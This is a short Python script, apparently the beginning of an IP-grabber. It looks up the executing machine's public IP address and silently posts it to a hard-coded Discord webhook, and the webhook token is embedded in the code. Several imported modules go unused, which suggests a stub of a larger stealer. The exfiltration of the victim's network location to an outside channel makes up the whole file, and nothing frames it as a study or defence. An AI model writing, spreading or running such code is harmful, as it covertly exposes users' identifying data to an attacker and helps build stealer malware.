
import subprocess
import platform
import os
from discord_webhook import DiscordWebhook
import socket
import requests
my_ip = requests.get('http://ip.42.pl/raw').text

content = my_ip
webhook = DiscordWebhook(url='https://discord.com/api/webhooks/888474232051351552/haXNyxVyb1Mlvt0VJeIeqpeV8ec5D7aRFCColVGFvuNzJyD9Y-6b5IeaNS80nj0i_Hae', content=content)
response = webhook.execute()

